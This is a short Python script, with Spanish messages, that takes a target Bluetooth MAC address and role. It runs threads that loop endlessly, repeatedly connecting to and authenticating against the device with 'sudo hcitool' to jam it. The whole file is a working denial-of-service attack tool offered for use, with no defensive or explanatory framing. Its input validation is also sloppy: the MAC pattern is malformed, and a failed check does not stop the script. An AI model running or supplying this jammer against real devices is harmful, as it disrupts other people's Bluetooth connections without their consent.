import time
import os
import argparse
import re
import threading
threads = 1

def jamming(mac, role, seconds):
	while(1):
		os.system('sudo hcitool cc --role='+ role + ' ' + mac)
		os.system('sudo hcitool auth ' + mac)
		time.sleep(seconds)


parser = argparse.ArgumentParser(description='MAC atacada y rol requerido.')
parser.add_argument('--mac', action='store', dest='mac')
parser.add_argument('--role', action='store', dest='role')

mac = parser.parse_args().mac
role = parser.parse_args().role

if(mac== None or role == None):
	print("Error. Debe introducir los argumentos --mac y --role.")
	exit()


MAC_RegEx = '^([0-9(a-f)|(A-F)]{2}[:-]){5}([0-9(A-F)(a-f)]{2})$'
role_RegEx = '^(s|m)$'

if not bool(re.match(MAC_RegEx, mac)):
	print("Error con la mac")
elif not bool(re.match(role_RegEx, role)):
	print("Error con el rol")

seconds=0
for i in range(threads):
	seconds+=0.5
	t = threading.Thread(target=jamming, args=(mac, role, seconds))
	t.start()


